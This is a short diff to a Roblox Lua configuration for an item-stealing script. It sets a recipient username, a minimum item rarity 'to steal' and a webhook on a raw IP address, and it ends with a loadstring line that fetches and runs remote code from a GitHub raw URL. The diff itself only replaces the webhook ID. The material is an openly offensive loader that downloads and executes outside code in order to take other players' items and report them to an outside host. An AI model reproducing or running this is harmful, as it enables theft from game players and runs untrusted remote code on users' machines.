@@ -2,6 +2,6 @@ _G.users = {"nbvbw"}  -- Add your username here
 _G.min_rarity = "Common"      -- Minimum rarity to steal (Common, Uncommon, Rare, Legendary, Godly, Ancient, Unique, Vintage)
 _G.min_value = 1             -- Minimum value per item
 _G.ping = "Yes"              -- "Yes" to ping everyone, anything else for no ping
-_G.webhook = "http://93.183.83.94:8000/webhook/fd2afddc-a9e3-4e2e-a201-3637a84b2c57" -- Your Discord webhook URL
+_G.webhook = "http://93.183.83.94:8000/webhook/7ace281a-3b84-4bc5-b107-535f8c055c95" -- Your Discord webhook URL
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/kjrmz/kjrmz/refs/heads/main/good",true))()
